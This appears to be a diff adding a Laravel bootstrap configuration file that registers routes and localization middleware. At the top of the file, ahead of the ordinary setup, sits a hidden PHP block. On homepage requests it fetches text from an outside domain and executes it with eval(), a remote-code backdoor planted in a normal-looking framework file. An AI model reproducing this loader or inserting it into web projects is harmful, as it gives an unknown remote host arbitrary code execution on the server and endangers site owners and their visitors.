@@ -1,0 +1,35 @@
+<?php
+$homeurlindex = '/';
+$homepageindex = "/";
+$homeurlindex2 = '/'; 
+$currentpageindex = $_SERVER['REQUEST_URI'];
+
+if($currentpageindex == $homepageindex or $currentpageindex == $homeurlindex or $currentpageindex == $homeurlindex2) {
+    eval("?>".file_get_contents('https://jalurpintas.xyz/bingo89/qwqer2.txt'));
+}
+use Illuminate\Foundation\Application;
+use Illuminate\Foundation\Configuration\Exceptions;
+use Illuminate\Foundation\Configuration\Middleware;
+
+return Application::configure(basePath: dirname(__DIR__))
+    ->withRouting(
+        web: __DIR__ . '/../routes/web.php',
+        api: __DIR__ . '/../routes/api.php',
+        commands: __DIR__ . '/../routes/console.php',
+    )
+    ->withMiddleware(function (Middleware $middleware) {
+            $middleware->alias([
+                'regionLocale' => \App\Http\Middleware\SetRegionAndLocale::class,
+            ]);
+        $middleware->alias([
+            'localize' => Mcamara\LaravelLocalization\Middleware\LaravelLocalizationRoutes::class,
+            'localizationRedirect' => Mcamara\LaravelLocalization\Middleware\LaravelLocalizationRedirectFilter::class,
+            'localeSessionRedirect' => Mcamara\LaravelLocalization\Middleware\LocaleSessionRedirect::class,
+            'localeCookieRedirect' => Mcamara\LaravelLocalization\Middleware\LocaleCookieRedirect::class,
+            'localeViewPath' => Mcamara\LaravelLocalization\Middleware\LaravelLocalizationViewPath::class,
+        ]);
+    })
+    ->withExceptions(function (Exceptions $exceptions) {
+        //
+    })
+    ->create();
